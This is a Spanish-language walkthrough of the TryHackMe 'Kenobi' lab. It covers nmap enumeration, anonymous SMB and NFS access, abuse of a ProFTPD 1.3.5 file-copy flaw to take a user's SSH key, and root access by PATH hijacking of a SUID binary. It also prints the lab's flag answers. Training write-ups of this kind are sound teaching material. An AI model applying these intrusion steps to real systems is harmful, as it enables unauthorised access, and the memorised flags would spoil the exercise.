---
title: TryHackMe - Kenobi
cover:
    image: "images/kenobi-tryhackme/kenobi.png"
categories: [Linux]
tags: [TryHackMe, eJPT, Linux]
---


Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation.

## Tarea 1(Deploy the vulnerable machine)

Empezaremos escaneando los puertos de la máquina con la herramienta Nmap.

```
nmap -sCV --min-rate 5000 -Pn -n -oN escaneo --open 10.10.219.160

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      35333/tcp   mountd
|   100005  1,2,3      37329/udp   mountd
|   100005  1,2,3      52221/udp6  mountd
|   100005  1,2,3      58723/tcp6  mountd
|   100021  1,3,4      33019/tcp   nlockmgr
|   100021  1,3,4      33498/udp   nlockmgr
|   100021  1,3,4      34081/tcp6  nlockmgr
|   100021  1,3,4      36526/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m00s, deviation: 3h27m51s, median: 0s
| smb2-time: 
|   date: 2022-11-25T20:33:01
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2022-11-25T14:33:01-06:00
```

En el puerto 21, hay una vulnerabilidad de la cual nos aprovecharemos más adelante.

### Preguntas

1. Make sure you're connected to our network and deploy the machine - ```No answer needed```
2. Scan the machine with nmap, how many ports are open? - ```7```

## Tarea 2(Enumerating Samba for shares)

Para enumerar los recursos compartidos que tiene esta máquina, utilizaremos unos scripts que trae nmap.

```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.219.160
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.219.160\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.219.160\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.219.160\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
```

Generalmente, los recursos compartidos que terminen con un ```$``` suelen ser por defectos, vamos a conectarnos al recurso llamado anonymous, haciendo uso de la herramienta ```smbclient```

```
smbclient -N //10.10.219.160/anonymous
Try "help" to get a list of possible commands.
smb: \> ls
  log.txt                  N    12237  Wed Sep  4 07:49:09 2019

		9204224 blocks of size 1024. 6877076 blocks available
smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (11,8 KiloBytes/sec) (average 11,8 KiloBytes/sec)
smb: \> exit
```

Al conectarnos vemos un archivo llamado log.txt, el cual hemos descargado con el comando get

```
cat log.txt| head -n 22
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
Created directory '/home/kenobi/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
The key randomart image is:
+---[RSA 2048]----+
|                 |
|           ..    |
|        . o. .   |
|       ..=o +.   |
|      . So.o++o. |
|  o ...+oo.Bo*o  |
| o o ..o.o+.@oo  |
|  . . . E .O+= . |
|     . .   oBo.  |
+----[SHA256]-----+
```

Al leer las primeras líneas del archivo, vemos la ruta de una id_rsa, vamos a 
guardar esa ruta por si la necesitamos en algún momento.

Si recordamos el escaneo de puertos que hicimos antes, estaba el puerto 111, vamos a enumerarlo usando unos scripts de nmap.

```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.219.160

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *
```

Como vemos podemos montar en nuestra máquina local el directorio compatido ```/var```, vamos a hacerlo.

### Preguntas

1. Using the nmap command above, how many shares have been found? - ```3```
2. Once you're connected, list the files on the share. What is the file can you see? - ```log.txt```
3. What port is FTP running on? - ```21```
4. What mount can we see? - ```/var```

## Tarea 3(Gain initial access with ProFtpd)

![image.png](https://i.postimg.cc/0j16zH8P/image.png)

Una vez tengamos montado el directorio /var de la máquina víctima en nuestra máquina local, recordemos que cuando hicimos el escaneo de puertos, les mencione que en el puerto 21(FTP) hay una vulnerabilidad, la cual consiste en poder copiar archivos de la máquina a cualquier otra ruta, ¿Qué vamos a hacer? Sencillo, lo que vamos a hacer a continuación es copiar la clave privada del SSH(id_rsa) al directorio /var el cual podemos listar porque lo tenemos montado en nuestra máquina.

![image.png](https://i.postimg.cc/xTVYcxZp/image.png)

Una vez copiado, si listamos el directorio tmp veremos que está el id_rsa, vamos a usarlo para conectarnos a la máquina.

![image.png](https://i.postimg.cc/g0gkhVhX/image.png)

``` 
kenobi@kenobi:~$ ls
share  user.txt
kenobi@kenobi:~$ cat user.txt 
d0b0f3f53b6caa532a83915e19224899
```

### Preguntas

1. What is the version? - ```1.3.5```
2. How many exploits are there for the ProFTPd running? - ```4```
3. We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. - ```No answer needed```
4. We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory. - ```No answer needed```
5. What is Kenobi's user flag (/home/kenobi/user.txt)? - ```d0b0f3f53b6caa532a83915e19224899```

## Tarea 4(Privilege Escalation)

Una vez ganando acceso a la máquina, vamos a intentar escalar nuestro privilegio, comenzaremos buscando por archivos que sean SUID.

``` 
kenobi@kenobi:~$ find / -perm -4000 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```

Al listar los archivos SUID de la máquina, nos podemos percatar de que hay uno un tanto peculiar, estoy hablando del /usr/bin/menu, vamos a ejecutarlo para ver que hace.

![image.png](https://i.postimg.cc/B66ZBmf9/image.png)

Simplemente, lo que hace este binario es ejecutar otros programas, si el binario está llamando al programa ejecutado por su ruta relativa y no su ruta absoluta, nosotros podemos modificar esa ruta para que ejecute nuestro propio programa, a esto se le llama [Path hijacking](https://walxom.net/privesc/explotacion-de-un-path-hijacking/)

```
kenobi@kenobi:~$ strings /usr/bin/menu | grep -C 3 "ifconfig"
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
 Invalid choice
;*3$"
GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
```

Como vemos a los programas los está llamando por su ruta relativa, así que lo podemos explotar, vamos a crear un archivo llamado ifconfig el cual va a contener el comando que queramos ejecutar, en mi caso le voy a poner para que le dé permisos SUID a la /bin/.

![image.png](https://i.postimg.cc/L4ZdjcgB/image.png)

```
-4.3# cat /root/root.txt
177b3cd8562289f37382721c28381f02
```

Genial, ya estamos como root, por ende ya hemos completado esta máquina.

### Preguntas

1. What file looks particularly out of the ordinary? - ```/usr/bin/menu```
2. Run the binary, how many options appear? - ```3```
3. What is the root flag (/root/root.txt)? - ```177b3cd8562289f37382721c28381f02```
